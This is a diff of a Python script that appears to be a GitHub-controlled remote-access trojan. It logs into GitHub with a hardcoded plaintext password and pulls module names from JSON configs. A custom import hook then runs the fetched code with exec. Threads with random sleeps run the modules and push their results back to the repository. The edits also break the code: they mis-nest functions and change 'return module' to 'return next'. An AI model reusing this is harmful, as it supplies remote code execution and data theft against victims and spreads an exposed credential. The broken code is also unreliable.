@@ -21,9 +21,7 @@ configured = False
 task_queue = queue.Queue()
 
 
-#connect to github and pick up code
-
-print ("Time to connect..")
+#connect to github and pick up code - WORKS
 
 def connect_to_github():
     gh = login(username="sindat",password="Lolnet011")
@@ -33,6 +31,7 @@ def connect_to_github():
 
     return gh,repo,branch
 
+#find the required json config files - WORKS
 def get_file_contents(filepath):
 
     gh,repo,branch = connect_to_github()
@@ -43,13 +42,11 @@ def get_file_contents(filepath):
 
         if filepath in filename.path:
 
-            print ("[*] Found file %s") % filepath
+            print ("[*] Found file " + str(filepath))
             blob = repo.blob(filename._json_data['sha'])
             return blob.content
 
     return None
-
-get_file_contents(spider_config)
 
 #get the config json and decode it
 def get_spider_config():
@@ -64,7 +61,6 @@ def get_spider_config():
 
             exec("import %s" % task['module'])
 
-    print ("Got config files..")
     return config
 
 #push the collected module data into the target machine
@@ -94,42 +90,43 @@ class GitImporter(object):
 
             return None
 
-    def load_module(self,name):
+        def load_module(self,name):
 
-        module = imp.new_module(name)
-        exec (self.current_module_code in module.__dict__)
-        sys.modules[name] = module
+            module = imp.new_module(name)
+            exec (self.current_module_code in module.__dict__)
+            sys.modules[name] = module
 
-        return module
+            return next
 
-    def module_runner(module):
+        def module_runner(module):
 
-        task_queue.put(1)
-        result = sys.modules[module].run()
-        task_queue.get()
+            task_queue.put(1)
+            result = sys.modules[module].run()
+            task_queue.get()
 
-        #store the result in the repo
-        store_module_result(result)
+            #store the result in the repo
+            store_module_result(result)
 
-        return
+            return
 
-        #the main loop of checking for new modules and loading them
-    
-        sys.meta_path = [GitImporter()]
+            #the main loop of checking for new modules and loading them
+        
+            sys.meta_path = [GitImporter()]
 
-        while True:
+            while True:
 
-            if task_queue.empty():
+                if task_queue.empty():
 
-                config = get_spider_config()
+                    config = get_spider_config()
 
-                for task in config:
+                    for task in config:
 
-                    t = threading.Thread(target=module_runner,args=(task['module'],))
-                    t.start()
-                    time.sleep(random.randint(1,10))
+                        t = threading.Thread(target=module_runner,args=(task['module'],))
+                        t.start()
+                        time.sleep(random.randint(1,10))
 
-            time.sleep(random.randint(1000,10000))
+                time.sleep(random.randint(1000,10000))
+
 
 
 
